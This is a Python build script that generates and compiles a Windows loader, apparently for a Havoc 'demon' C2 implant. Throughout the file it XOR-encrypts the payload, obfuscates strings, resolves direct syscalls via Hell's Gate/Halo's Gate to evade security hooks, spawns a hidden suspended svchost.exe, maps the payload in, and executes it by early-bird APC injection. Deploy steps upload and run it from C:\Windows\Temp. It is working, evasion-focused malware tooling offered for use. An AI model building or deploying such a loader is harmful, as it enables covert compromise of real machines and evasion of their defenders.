#!/usr/bin/env python3
"""
gen_inject.py — Process injection via NtCreateSection + NtMapViewOfSection + earlybird APC

Technique: creates target process SUSPENDED, maps shellcode via a named section object
(avoids NtWriteVirtualMemory / WriteProcessMemory pattern), queues APC to main thread.

Uses Hell's Gate / Halo's Gate SSN resolution + dynamic syscall stubs (same as gen_sh.py).
No winternl.h, no __builtin_va_arg_pack — typed function pointers per syscall.

Deploy:
    python3 gen_inject.py
    upload bypass/inject.exe  C:\\Windows\\Temp\\inj.exe
    upload demon_enc.dat      C:\\Windows\\Temp\\demon_enc.dat   (from gen_sh.py)
    shell C:\\Windows\\Temp\\inj.exe
"""

import os, sys, subprocess, shutil, tempfile

ROOT   = os.path.dirname(os.path.abspath(__file__))
DAT    = os.path.join(ROOT, 'demon_enc.dat')
if not os.path.exists(DAT):
    DAT = os.path.join(ROOT, '..', 'demon_enc.dat')
OUT    = os.path.join(ROOT, 'inject.exe')

if not os.path.exists(DAT):
    sys.exit('[!] demon_enc.dat not found — run gen_sh.py first')

raw = open(DAT, 'rb').read()
# Parse the XOR key from the existing dat (we just re-use it, same key)
# The key is embedded in sh.exe — here we only need the dat file
# gen_sh.py uses 16-byte random key; for inject.exe we apply the same
# key by reading the key value stored in sh.exe or just re-generating
# For simplicity: require the user ran gen_sh.py and use the same demon_enc.dat
# The XOR key in sh.exe is baked in at compile time; inject.exe needs the same key.
# Solution: gen_inject.py reads the key from gen_sh.py output (sh.exe) or we
# allow specifying the key, OR we re-encrypt with a known key here.

# Easiest: re-encrypt demon.x64.dll with our own key embedded in inject.exe
DLL_PATH = os.path.join(ROOT, '..', 'demon.x64.dll')
if not os.path.exists(DLL_PATH):
    DLL_PATH = os.path.join(ROOT, 'demon.x64.dll')
if not os.path.exists(DLL_PATH):
    # Fallback: try to decrypt the existing dat with XOR 0x5B (gen_sh.py default)
    print('[!] demon.x64.dll not found — using existing demon_enc.dat with XOR key 0x5B')
    KEY_BYTE = 0x5B
    key_c    = ','.join(['0x5B']*16)
else:
    import secrets
    dll      = open(DLL_PATH, 'rb').read()
    key      = secrets.token_bytes(16)
    enc      = bytes([dll[i] ^ key[i % 16] for i in range(len(dll))])
    key_c    = ','.join(f'0x{b:02X}' for b in key)
    # write new dat for inject.exe
    inject_dat = os.path.join(ROOT, 'inject_enc.dat')
    open(inject_dat, 'wb').write(enc)
    raw = enc
    DAT = inject_dat
    print(f'[+] DLL: {len(dll):,} bytes  key: {key.hex()}')

DAT_WIN = r'C:\Windows\Temp\demon_enc.dat'

STR_KEY = 0x4A
def enc_str(s): return ','.join(str(ord(c) ^ STR_KEY) for c in s + '\x00')

dat_path_e  = enc_str(DAT_WIN)

c_src = f"""
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>

typedef LONG NTSTATUS;
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

#define STR_KEY 0x{STR_KEY:02X}
static void xd(char *o, const BYTE *e, int n) {{
    for (int i=0;i<n;i++) o[i]=(char)(e[i]^STR_KEY);
}}
static const BYTE DAT_E[] = {{{dat_path_e}}};

/* ── XOR-16 key ─────────────────────────────────────────────────────────── */
static const BYTE XK[16] = {{{key_c}}};

/* ── Typed syscall stubs (function pointers) ─────────────────────────────── */
/* NtCreateSection */
typedef NTSTATUS (*FnCS)(PHANDLE,ULONG,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
/* NtMapViewOfSection: InheritDisposition as DWORD to avoid enum definition */
typedef NTSTATUS (*FnMVS)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG);
/* NtUnmapViewOfSection */
typedef NTSTATUS (*FnUVS)(HANDLE,PVOID,SIZE_T);
/* NtQueueApcThread */
typedef NTSTATUS (*FnQAT)(HANDLE,PVOID,PVOID,PVOID,PVOID);
/* NtResumeThread */
typedef NTSTATUS (*FnRT)(HANDLE,PULONG);
/* NtProtectVirtualMemory — for stub page flip */
typedef NTSTATUS (*FnPVM)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
/* NtAllocateVirtualMemory — for stub page alloc */
typedef NTSTATUS (*FnAVM)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);

/* Hardcoded fallback stubs for bootstrapping (stable SSNs on Win10/11 x64) */
__attribute__((naked)) static void _nt_protect_hc(void) {{
    __asm__("mov %rcx,%r10\\n mov $0x50,%eax\\n syscall\\n ret\\n");
}}
__attribute__((naked)) static void _nt_alloc_hc(void) {{
    __asm__("mov %rcx,%r10\\n mov $0x18,%eax\\n syscall\\n ret\\n");
}}

/* ── Hell's Gate + Halo's Gate SSN resolver ─────────────────────────────── */
typedef struct {{ DWORD rva; const char *name; }} NtExp;
static int cmp_rva(const void *a, const void *b) {{
    DWORD ra=((NtExp*)a)->rva, rb=((NtExp*)b)->rva;
    return (ra>rb)-(ra<rb);
}}
static DWORD ssn_of(HMODULE ntdll, const char *fn) {{
    BYTE *base=(BYTE*)ntdll;
    int eo=*(int*)(base+0x3C);
    DWORD *exp_rva=(DWORD*)(base+*(int*)(base+eo+0x18+96));
    DWORD edir=*(DWORD*)(base+eo+0x18+96);
    typedef struct {{ DWORD chars,name,base,nfuncs,nnames,funcs,names,ords; }} EXP;
    EXP *ed=(EXP*)(base+edir);
    DWORD *names=(DWORD*)(base+ed->names);
    DWORD *funcs=(DWORD*)(base+ed->funcs);
    WORD  *ords =(WORD* )(base+ed->ords);
    NtExp *arr=(NtExp*)malloc(ed->nnames*sizeof(NtExp));
    if (!arr) return ~0u;
    int cnt=0;
    for (DWORD i=0;i<ed->nnames;i++) {{
        const char *n=(const char*)(base+names[i]);
        if (n[0]=='N'&&n[1]=='t') {{ arr[cnt].rva=funcs[ords[i]]; arr[cnt].name=n; cnt++; }}
    }}
    qsort(arr,cnt,sizeof(NtExp),cmp_rva);
    DWORD ssn=~0u;
    for (int i=0;i<cnt;i++) {{
        if (strcmp(arr[i].name,fn)) continue;
        BYTE *s=base+arr[i].rva;
        if (s[0]==0x4C&&s[1]==0x8B&&s[2]==0xD1&&s[3]==0xB8) {{ ssn=*(DWORD*)(s+4); break; }}
        for (int d=1;d<10;d++) {{
            if (i-d>=0) {{ BYTE *t=base+arr[i-d].rva;
                if (t[0]==0x4C&&t[1]==0x8B&&t[2]==0xD1&&t[3]==0xB8) {{ ssn=*(DWORD*)(t+4)+d; break; }} }}
            if (ssn!=~0u) break;
            if (i+d<cnt) {{ BYTE *t=base+arr[i+d].rva;
                if (t[0]==0x4C&&t[1]==0x8B&&t[2]==0xD1&&t[3]==0xB8) {{ ssn=*(DWORD*)(t+4)-d; break; }} }}
            if (ssn!=~0u) break;
        }}
        break;
    }}
    free(arr); return ssn;
}}

static BYTE *g_stubs=NULL; static int g_sc=0;
static void *make_stub(DWORD ssn) {{
    BYTE *s=g_stubs+g_sc++*16;
    s[0]=0x4C;s[1]=0x8B;s[2]=0xD1;
    s[3]=0xB8;*(DWORD*)(s+4)=ssn;
    s[8]=0x0F;s[9]=0x05;s[10]=0xC3;
    return s;
}}

static void ep(const wchar_t *n) {{
    HANDLE t; if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&t)) return;
    LUID l; if (LookupPrivilegeValueW(NULL,n,&l)) {{
        TOKEN_PRIVILEGES tp={{1,{{{{l,SE_PRIVILEGE_ENABLED}}}}}};
        AdjustTokenPrivileges(t,FALSE,&tp,0,NULL,NULL);
    }}
    CloseHandle(t);
}}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int sh) {{
    (void)h;(void)p;(void)c;(void)sh;

    ep(L"SeDebugPrivilege");

    /* 1. Allocate stub page RW */
    g_stubs=(BYTE*)VirtualAlloc(NULL,4096,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if (!g_stubs) return 1;

    /* 2. Resolve SSNs */
    HMODULE ntdll=GetModuleHandleA("ntdll.dll");
    DWORD ssn_cs  = ssn_of(ntdll,"NtCreateSection");
    DWORD ssn_mvs = ssn_of(ntdll,"NtMapViewOfSection");
    DWORD ssn_uvs = ssn_of(ntdll,"NtUnmapViewOfSection");
    DWORD ssn_qat = ssn_of(ntdll,"NtQueueApcThread");
    DWORD ssn_rt  = ssn_of(ntdll,"NtResumeThread");
    DWORD ssn_pvm = ssn_of(ntdll,"NtProtectVirtualMemory");
    /* Fallbacks */
    if (ssn_cs ==~0u) ssn_cs =0x4A;
    if (ssn_mvs==~0u) ssn_mvs=0x28;
    if (ssn_uvs==~0u) ssn_uvs=0x2A;
    if (ssn_qat==~0u) ssn_qat=0x44;
    if (ssn_rt ==~0u) ssn_rt =0x52;
    if (ssn_pvm==~0u) ssn_pvm=0x50;

    /* 3. Write stubs */
    FnCS  NtCS  = (FnCS )make_stub(ssn_cs);
    FnMVS NtMVS = (FnMVS)make_stub(ssn_mvs);
    FnUVS NtUVS = (FnUVS)make_stub(ssn_uvs);
    FnQAT NtQAT = (FnQAT)make_stub(ssn_qat);
    FnRT  NtRT  = (FnRT )make_stub(ssn_rt);
    FnPVM NtPVM = (FnPVM)make_stub(ssn_pvm);

    /* 4. Flip RW → RX using hardcoded _nt_protect_hc */
    {{
        HANDLE cur=(HANDLE)(LONG_PTR)-1; PVOID sp=g_stubs; SIZE_T ss=4096; ULONG sold=0;
        ((FnPVM)_nt_protect_hc)(cur,&sp,&ss,PAGE_EXECUTE_READ,&sold);
    }}

    /* 5. Load encrypted payload from disk */
    char dat_path[MAX_PATH]={{0}};
    xd(dat_path,DAT_E,sizeof(DAT_E)-1);
    HANDLE hf=CreateFileA(dat_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if (hf==INVALID_HANDLE_VALUE) return 2;
    DWORD fsz=GetFileSize(hf,NULL);
    BYTE *buf=(BYTE*)malloc(fsz);
    if (!buf) {{ CloseHandle(hf); return 3; }}
    DWORD rd=0; ReadFile(hf,buf,fsz,&rd,NULL); CloseHandle(hf);
    if (rd!=fsz) {{ free(buf); return 4; }}

    /* 6. XOR-16 decrypt */
    for (DWORD i=0;i<fsz;i++) buf[i]^=XK[i%16];

    /* 7. Create section of payload size */
    HANDLE hSec=NULL;
    LARGE_INTEGER sec_sz; sec_sz.QuadPart=(LONGLONG)fsz;
    NTSTATUS st=NtCS(&hSec,SECTION_ALL_ACCESS,NULL,&sec_sz,PAGE_EXECUTE_READWRITE,SEC_COMMIT,NULL);
    if (!NT_SUCCESS(st)) {{ free(buf); return 5; }}

    /* 8. Map into current process (write) */
    PVOID lv=NULL; SIZE_T vsz=0;
    st=NtMVS(hSec,(HANDLE)(LONG_PTR)-1,&lv,0,0,NULL,&vsz,2/*ViewUnmap*/,0,PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {{ free(buf); CloseHandle(hSec); return 6; }}
    memcpy(lv,buf,fsz); free(buf);
    /* unmap local */
    NtUVS((HANDLE)(LONG_PTR)-1,lv,0);

    /* 9. Create target svchost.exe SUSPENDED */
    STARTUPINFOA si={{sizeof(si)}}; si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
    PROCESS_INFORMATION pi={{0}};
    if (!CreateProcessA("C:\\\\Windows\\\\System32\\\\svchost.exe",
            "svchost.exe -k netsvcs -p",NULL,NULL,FALSE,
            CREATE_SUSPENDED|CREATE_NO_WINDOW|DETACHED_PROCESS,NULL,NULL,&si,&pi))
        {{ CloseHandle(hSec); return 7; }}

    /* 10. Map section into target (execute) */
    PVOID rv=NULL; vsz=0;
    st=NtMVS(hSec,pi.hProcess,&rv,0,0,NULL,&vsz,2/*ViewUnmap*/,0,PAGE_EXECUTE_READ);
    CloseHandle(hSec);
    if (!NT_SUCCESS(st)) {{ TerminateProcess(pi.hProcess,0); return 8; }}

    /* 11. Queue APC to main thread — fires when thread enters alertable wait */
    NtQAT(pi.hThread,(PVOID)rv,NULL,NULL,NULL);

    /* 12. Resume thread */
    ULONG prev=0;
    NtRT(pi.hThread,&prev);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}}
"""

tmp = tempfile.mkdtemp(prefix='inject_build_')
try:
    src = os.path.join(tmp, 'inject.c')
    exe = os.path.join(tmp, 'inject.exe')
    with open(src, 'w') as f:
        f.write(c_src)

    print('[*] Compiling inject.exe (NtMapViewOfSection + earlybird APC) ...')
    r = subprocess.run([
        'x86_64-w64-mingw32-gcc', '-O2', '-s', '-mwindows',
        '-o', exe, src,
        '-lkernel32', '-ladvapi32',
        '-Wl,--no-seh', '-fno-ident', '-fno-asynchronous-unwind-tables',
    ], capture_output=True, text=True)

    if r.returncode != 0:
        dbg = os.path.join(ROOT, 'inject_debug.c')
        with open(dbg, 'w') as f:
            f.write(c_src)
        print(f'[!] Build failed — source in {dbg}')
        print(r.stderr[-4000:])
        sys.exit(1)

    shutil.copy(exe, OUT)
finally:
    shutil.rmtree(tmp, ignore_errors=True)

print(f'[+] {OUT}  ({os.path.getsize(OUT):,} bytes)')
print()
print('Deploy:')
print(f'  upload {OUT} C:\\Windows\\Temp\\inj.exe')
dat_deploy = os.path.join(ROOT, 'inject_enc.dat') if os.path.exists(os.path.join(ROOT, 'inject_enc.dat')) else DAT
print(f'  upload {dat_deploy} C:\\Windows\\Temp\\demon_enc.dat')
print(f'  shell C:\\Windows\\Temp\\inj.exe')
print()
print('Injects demon into a new suspended svchost.exe via NtMapViewOfSection.')
print('No WriteProcessMemory. No VirtualAllocEx. No CreateRemoteThread.')
